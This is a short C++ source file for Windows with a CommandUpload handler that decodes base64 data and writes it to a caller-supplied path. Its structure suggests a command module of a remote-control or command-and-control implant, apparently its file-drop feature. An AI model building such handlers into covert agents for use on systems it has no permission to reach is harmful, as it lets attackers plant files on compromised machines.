#include "Command.h"

#include "Stdlib.h"

BOOL CommandUpload(json& args, string artifact, json& result) {
    DWORD   size    = 0;
    PVOID   data    = NULL;
    HANDLE  hFile   = NULL;
    auto    path    = args[0].get<string>();
    DWORD   written = 0;

	data = Base64Decode(artifact.c_str(), &size);
	if (data == NULL) {
		return FALSE;
	}

    hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFileA failed: ( %d )\n", GetLastError());
        return FALSE;
    }

    if (WriteFile(hFile, data, size, &written, NULL) == FALSE) {
        printf("WriteFile failed: ( %d )\n", GetLastError());
        return FALSE;
    }

    CloseHandle(hFile);

    result["output"] = "file written successfuly";

    return TRUE;
}